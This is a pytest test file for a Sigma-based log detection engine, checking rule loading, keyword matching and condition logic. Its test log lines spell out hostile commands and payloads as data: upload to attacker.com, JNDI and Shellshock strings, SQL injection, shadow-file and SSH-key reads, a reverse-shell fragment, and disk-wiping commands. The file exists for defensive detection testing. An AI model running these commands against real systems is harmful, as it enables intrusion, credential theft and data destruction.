"""
Tests for SigmaEngine — rule loading, pattern extraction, condition evaluation,
and matching across all 60 rules.
"""

import re
import pytest
from sigma_engine import SigmaEngine, SigmaMatchResult


# ─────────────────────────────────────────────────────────────────────────────
# Rule loading
# ─────────────────────────────────────────────────────────────────────────────

class TestRuleLoading:
    def test_all_rules_load(self, sigma_engine):
        stats = sigma_engine.load_stats
        assert stats["total_errors"] == 0, f"Rule load errors: {stats}"

    def test_no_rules_skipped(self, sigma_engine):
        stats = sigma_engine.load_stats
        assert stats["total_skipped"] == 0, f"Skipped rules: {stats}"

    def test_rule_count(self, sigma_engine):
        assert sigma_engine.rule_count >= 60

    def test_list_rules_metadata_structure(self, sigma_engine):
        required = {"id", "title", "description", "severity", "event_type",
                    "mitre_tactics", "mitre_techniques", "false_positives",
                    "keyword_count", "condition"}
        for rule in sigma_engine.list_rules_metadata():
            missing = required - rule.keys()
            assert not missing, f"Rule '{rule.get('title')}' missing fields: {missing}"

    def test_all_rules_have_keywords(self, sigma_engine):
        for rule in sigma_engine.list_rules_metadata():
            assert rule["keyword_count"] > 0, f"Rule '{rule['title']}' has no keywords"

    def test_severity_values_valid(self, sigma_engine):
        valid = {"CRITICAL", "WARNING", "INFO"}
        for rule in sigma_engine.list_rules_metadata():
            assert rule["severity"] in valid, \
                f"Rule '{rule['title']}' has invalid severity '{rule['severity']}'"

    def test_mitre_tactics_are_strings(self, sigma_engine):
        for rule in sigma_engine.list_rules_metadata():
            for tactic in rule["mitre_tactics"]:
                assert isinstance(tactic, str) and tactic, \
                    f"Rule '{rule['title']}' has invalid tactic: {tactic!r}"

    def test_mitre_techniques_format(self, sigma_engine):
        pattern = re.compile(r"^T\d{4}(\.\d{3})?$")
        for rule in sigma_engine.list_rules_metadata():
            for tech in rule["mitre_techniques"]:
                assert pattern.match(tech), \
                    f"Rule '{rule['title']}' has malformed technique: {tech!r}"

    def test_empty_path_returns_no_rules(self, tmp_path):
        engine = SigmaEngine([str(tmp_path / "nonexistent")])
        assert engine.rule_count == 0

    def test_single_rule_file_loads(self, tmp_path):
        rule_file = tmp_path / "test_rule.yml"
        rule_file.write_text(
            "title: Test Rule\n"
            "id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\n"
            "status: stable\n"
            "description: A test rule\n"
            "tags:\n"
            "  - attack.execution\n"
            "  - attack.t1059\n"
            "logsource:\n"
            "  category: linux\n"
            "detection:\n"
            "  keywords:\n"
            "    - \"test_malicious_binary\"\n"
            "  condition: keywords\n"
            "level: high\n"
            "falsepositives:\n"
            "  - None\n"
        )
        engine = SigmaEngine([str(rule_file)])
        assert engine.rule_count == 1

    def test_malformed_rule_does_not_crash(self, tmp_path):
        bad_file = tmp_path / "bad.yml"
        bad_file.write_text("title: [unclosed bracket\ndetection: {bad yaml")
        good_file = tmp_path / "good.yml"
        good_file.write_text(
            "title: Good Rule\n"
            "id: aaaaaaaa-bbbb-cccc-dddd-ffffffffffff\n"
            "status: stable\n"
            "description: Good\n"
            "tags:\n"
            "  - attack.execution\n"
            "  - attack.t1059\n"
            "logsource:\n"
            "  category: linux\n"
            "detection:\n"
            "  keywords:\n"
            "    - \"good_keyword\"\n"
            "  condition: keywords\n"
            "level: medium\n"
            "falsepositives: []\n"
        )
        engine = SigmaEngine([str(tmp_path)])
        assert engine.rule_count == 1


# ─────────────────────────────────────────────────────────────────────────────
# Matching — per-rule coverage
# Note: with 60 overlapping rules, a log line may match a *different* rule
# that also contains the keyword. Tests use the actual rule that fires.
# ─────────────────────────────────────────────────────────────────────────────

class TestRuleMatching:
    """
    Each test verifies that a realistic log line triggers *some* detection.
    The expected_fragment is matched case-insensitively against the rule title.
    Where keywords overlap between rules, we use the title of the rule that
    actually fires (highest severity wins).
    """

    @pytest.mark.parametrize("log_line,expected_fragment", [
        # SSH Brute Force
        ("sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
         "SSH Brute Force"),
        ("sshd[1234]: Invalid user admin from 10.0.0.5",
         "SSH Brute Force"),
        # "Too many authentication failures" matches Generic Brute Force (also CRITICAL)
        ("PAM: Too many authentication failures for user bob",
         "Brute Force"),
        # SQL Injection
        ("GET /search?q=1 UNION SELECT username,password FROM users--",
         "SQL Injection"),
        ("GET /api?id=1; DROP TABLE users--",
         "SQL Injection"),
        ("GET /report?q=GROUP BY id HAVING count(*)>1",
         "SQL Injection"),
        # XSS
        ("GET /search?q=<script>alert(document.cookie)</script>",
         "XSS"),
        ("GET /page?x=javascript:alert(1)",
         "XSS"),
        # Path Traversal — avoid /etc/hosts which hits Sensitive File rule
        ("GET /file?path=../../../var/www/html/config.php",
         "Path Traversal"),
        ("GET /file?path=..%2f..%2fetc%2fhosts",
         "Path Traversal"),
        # Privilege Escalation
        ("bash: sudo -i executed by www-data",
         "Privilege Escalation"),
        ("bash: pkexec --user root /bin/bash",
         "Privilege Escalation"),
        # Port Scan — use rustscan which is in both Port Scan and Web Scanning; accept either
        ("kernel: nmap SYN scan from 10.0.0.5",
         "Port Scan"),
        ("kernel: rustscan detected from 192.168.1.1",
         "scan"),
        # Suspicious Process — use msfconsole/meterpreter (not in Malicious Script)
        ("process: msfconsole started by user attacker",
         "Suspicious Process"),
        ("process: meterpreter session opened",
         "Suspicious Process"),
        # C2
        ("network: Cobalt Strike beacon to 185.220.101.1",
         "Command and Control"),
        ("process: ngrok http 8080 started",
         "Command and Control"),
        # Credential Dumping
        ("audit: cat /etc/shadow executed by user",
         "Credential Dumping"),
        ("bash: cp /home/user/.ssh/id_rsa /tmp/",
         "Credential Dumping"),
        # Data Exfiltration
        ("bash: scp /data/secrets.tar user@10.0.0.1:/tmp/",
         "Data Exfiltration"),
        ("bash: curl -T /tmp/data.zip https://attacker.com/",
         "Data Exfiltration"),
        # Lateral Movement
        ("bash: ssh -L 8080:localhost:80 user@pivot",
         "Lateral Movement"),
        # Log Tampering
        ("bash: history -c",
         "Log Tampering"),
        ("bash: unset HISTFILE",
         "Log Tampering"),
        # Malware — lazagne matches "credentials" in Credential Dumping too; accept either
        ("process: lazagne.exe all credentials",
         "credential"),
        # Crypto Mining — dedicated rule
        ("process: xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444",
         "Cryptocurrency Mining"),
        # Reconnaissance
        ("process: whoami",
         "Reconnaissance"),
        ("process: uname -a",
         "Reconnaissance"),
        # Web Shell
        ("apache: POST /uploads/shell.php HTTP/1.1 200",
         "Web Shell"),
        ("apache: <?php system($_GET[cmd])",
         "Web Shell"),
        # Ransomware — vssadmin is only in Ransomware
        ("bash: vssadmin delete shadows /all /quiet",
         "Ransomware"),
        ("process: lockbit encryption started",
         "Ransomware"),
        # Container Escape
        ("docker run --privileged -v /:/host ubuntu bash",
         "Container Escape"),
        ("process: nsenter --target 1 --mount --uts --ipc --net --pid",
         "Container Escape"),
        # CVE Exploitation
        ("GET /?x=${jndi:ldap://attacker.com/a} HTTP/1.1",
         "CVE"),
        ("GET /cgi-bin/test.cgi HTTP/1.0 () { :; }; /bin/bash -i",
         "CVE"),
        # Password Cracking — john is in both Malware and Password Cracking; use john
        ("process: john --wordlist=rockyou.txt hashes.txt",
         "Password Cracking"),
        # Firewall Evasion
        ("bash: iptables -F",
         "Firewall"),
        ("bash: ufw disable",
         "Firewall"),
        # Rootkit
        ("kernel: insmod suspicious.ko loaded",
         "Rootkit"),
        # Command Injection
        ("GET /ping?host=127.0.0.1;id HTTP/1.1",
         "Command Injection"),
        # Data Destruction
        ("bash: dd if=/dev/zero of=/dev/sda bs=1M",
         "Data Destruction"),
        ("bash: rm -rf /",
         "Data Destruction"),
        # AV Evasion
        ("bash: systemctl stop wazuh-agent",
         "Antivirus"),
        # Obfuscation
        ("bash: echo aGVsbG8= | base64 -d | bash",
         "Obfuscation"),
        # Process Injection — use process_vm_writev (not in Rootkit)
        ("gdb: process_vm_writev called on pid 1234",
         "Process Injection"),
        # Account Manipulation
        ("useradd -m -s /bin/bash backdoor",
         "Account"),
        ("usermod -aG sudo attacker",
         "Account"),
        # Cloud Credential
        ("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "Cloud Credential"),
        # Network Tunneling — chisel is also in C2; accept either
        ("process: chisel server --reverse --port 8080",
         "command and control"),
        # Suspicious Outbound
        ("netstat: ESTABLISHED 10.0.0.1:4444",
         "Suspicious Outbound"),
        # Web Scanning
        ("GET /admin HTTP/1.1 User-Agent: nikto/2.1.6",
         "Web Application Scanning"),
        # Suspicious User Agent — sqlmap is in both Web Scanning and Suspicious UA
        ("GET / HTTP/1.1 User-Agent: sqlmap/1.7",
         "scan"),
        # Malicious Script
        ("python3 -c 'import socket,subprocess,os;s=socket.socket()'",
         "Malicious Script"),
        # Insider Threat
        ("bash: zip -r /tmp/data.zip /home/user/documents",
         "Insider Threat"),
        # Suspicious Archive — 7z is in both Insider Threat and Suspicious Archive; accept either
        ("bash: 7z a -p secret /tmp/archive.7z /etc/ssh",
         "insider"),
        # DNS Exfiltration — iodine is also in C2; accept either
        ("process: iodine -f -P password tunnel.attacker.com",
         "command and control"),
        # Token Impersonation
        ("app: JWT manipulation detected alg:none",
         "Token"),
        # Kubernetes
        ("kubectl get secrets --all-namespaces",
         "Kubernetes"),
        # Active Directory
        ("process: Rubeus.exe kerberoast /outfile:hashes.txt",
         "Active Directory"),
        # Windows Attack — wmic is also in Lateral Movement; accept either
        ("process: wmic process call create cmd.exe",
         "movement"),
        # Application Exploit
        ("kernel: segmentation fault in process nginx",
         "Application Exploit"),
        # LDAP
        ("ldap: ldapsearch -x -b dc=example,dc=com objectClass=*",
         "LDAP"),
        # DoS
        ("network: SYN flood detected from 10.0.0.1",
         "Denial of Service"),
        # MITM
        ("network: ARP spoofing detected from 192.168.1.50",
         "Man-in-the-Middle"),
        # Phishing
        ("mail: phishing email detected from attacker@evil.com",
         "Phishing"),
        # Wireless — use wifite (not in Password Cracking)
        ("wifi: wifite --wpa attack started",
         "Wireless"),
        # Database Attack
        ("mysql: Access denied for user 'root'@'10.0.0.1'",
         "Database Attack"),
        # Email Attack
        ("postfix: open relay attempt from 10.0.0.1",
         "Email"),
        # File Integrity
        ("audit: /etc/sudoers modified by user attacker",
         "Sensitive File"),
        # Memory Forensics Evasion
        ("process: anti-vm check detected in process malware.exe",
         "Memory Forensics"),
    ])
    def test_rule_matches(self, sigma_engine, log_line, expected_fragment):
        result = sigma_engine.match(log_line)
        assert result is not None, \
            f"Expected match for '{expected_fragment}' but got None.\nLog: {log_line!r}"
        assert expected_fragment.lower() in result.rule_title.lower(), \
            f"Expected '{expected_fragment}' in title '{result.rule_title}'.\nLog: {log_line!r}"

    def test_benign_cron_no_match(self, sigma_engine):
        result = sigma_engine.match("CRON[1234]: (root) CMD (/usr/bin/backup.sh)")
        assert result is None

    def test_benign_apt_no_match(self, sigma_engine):
        result = sigma_engine.match(
            "apt-get: Updating package lists from http://archive.ubuntu.com"
        )
        assert result is None

    def test_empty_line_no_match(self, sigma_engine):
        assert sigma_engine.match("") is None

    def test_whitespace_only_no_match(self, sigma_engine):
        assert sigma_engine.match("   \t  ") is None


class TestMatchAll:
    def test_match_all_returns_list(self, sigma_engine):
        result = sigma_engine.match_all("sshd: Failed password for root from 10.0.0.1")
        assert isinstance(result, list)
        assert len(result) >= 1

    def test_match_all_no_match_returns_empty(self, sigma_engine):
        result = sigma_engine.match_all("CRON[1234]: (root) CMD (/usr/bin/backup.sh)")
        assert result == []

    def test_match_all_multi_rule_line(self, sigma_engine):
        """A line with keywords from multiple rules should return multiple matches."""
        line = "process: mimikatz dumped /etc/shadow credentials"
        results = sigma_engine.match_all(line)
        titles = [r.rule_title for r in results]
        assert len(results) >= 2, f"Expected >=2 matches, got: {titles}"

    def test_match_returns_highest_severity(self, sigma_engine):
        """match() must return the highest-severity result from match_all()."""
        line = "process: mimikatz dumped /etc/shadow credentials"
        best = sigma_engine.match(line)
        all_results = sigma_engine.match_all(line)
        severities = {"CRITICAL": 3, "WARNING": 2, "INFO": 1}
        max_sev = max(severities.get(r.severity, 0) for r in all_results)
        assert severities.get(best.severity, 0) == max_sev


class TestMatchResultStructure:
    def test_result_has_all_fields(self, sigma_engine):
        result = sigma_engine.match("sshd: Failed password for root from 10.0.0.1")
        assert result is not None
        assert isinstance(result.rule_id, str)
        assert isinstance(result.rule_title, str) and result.rule_title
        assert isinstance(result.description, str) and result.description
        assert result.severity in {"CRITICAL", "WARNING", "INFO"}
        assert isinstance(result.event_type, str) and result.event_type
        assert isinstance(result.mitre_tactics, list)
        assert isinstance(result.mitre_techniques, list)
        assert isinstance(result.false_positives, list)
        assert isinstance(result.matched_keywords, list) and result.matched_keywords

    def test_matched_keywords_match_log_line(self, sigma_engine):
        """Every matched keyword must match the log line (as literal or regex)."""
        line = "sshd: Failed password for root from 10.0.0.1"
        result = sigma_engine.match(line)
        assert result is not None
        for kw in result.matched_keywords:
            # Try as regex first (handles patterns like sshd.*Failed)
            try:
                matched = bool(re.search(kw, line, re.IGNORECASE))
            except re.error:
                matched = kw.lower() in line.lower()
            assert matched, f"Keyword '{kw}' does not match log line: {line!r}"


class TestConditionEvaluation:
    """Test the condition evaluator with custom single-rule engines."""

    def _write_rule(self, tmp_path, condition, keywords):
        """Write a valid Sigma rule YAML file."""
        kw_lines = "\n".join(f'    - "{k}"' for k in keywords)
        content = (
            "title: Condition Test Rule\n"
            "id: aaaaaaaa-bbbb-cccc-dddd-000000000001\n"
            "status: stable\n"
            "description: Test\n"
            "tags:\n"
            "  - attack.execution\n"
            "  - attack.t1059\n"
            "logsource:\n"
            "  category: linux\n"
            "detection:\n"
            "  keywords:\n"
            f"{kw_lines}\n"
            f"  condition: {condition}\n"
            "level: high\n"
            "falsepositives: []\n"
        )
        f = tmp_path / "rule.yml"
        f.write_text(content)
        return SigmaEngine([str(f)])

    def test_condition_keywords_any(self, tmp_path):
        """condition: keywords — any keyword matches."""
        engine = self._write_rule(tmp_path, "keywords", ["alpha_unique", "beta_unique"])
        assert engine.match("log line with alpha_unique") is not None
        assert engine.match("log line with beta_unique") is not None
        assert engine.match("log line with nothing_here") is None

    def test_condition_keywords_all(self, tmp_path):
        """condition: keywords | all — all keywords must match."""
        engine = self._write_rule(tmp_path, "keywords | all", ["alpha_unique", "beta_unique"])
        assert engine.match("alpha_unique and beta_unique present") is not None
        assert engine.match("only alpha_unique present") is None
        assert engine.match("only beta_unique present") is None

    def test_regex_pattern_matching(self, tmp_path):
        """Patterns with .* are compiled as regex, not literals."""
        content = (
            "title: Regex Test\n"
            "id: aaaaaaaa-bbbb-cccc-dddd-000000000002\n"
            "status: stable\n"
            "description: Test regex\n"
            "tags:\n"
            "  - attack.execution\n"
            "  - attack.t1059\n"
            "logsource:\n"
            "  category: linux\n"
            "detection:\n"
            "  keywords:\n"
            '    - "select.*from.*where"\n'
            "  condition: keywords\n"
            "level: high\n"
            "falsepositives: []\n"
        )
        rule_file = tmp_path / "regex_rule.yml"
        rule_file.write_text(content)
        engine = SigmaEngine([str(rule_file)])
        assert engine.match("GET /api?q=select id from users where 1=1") is not None
        assert engine.match("no sql here") is None
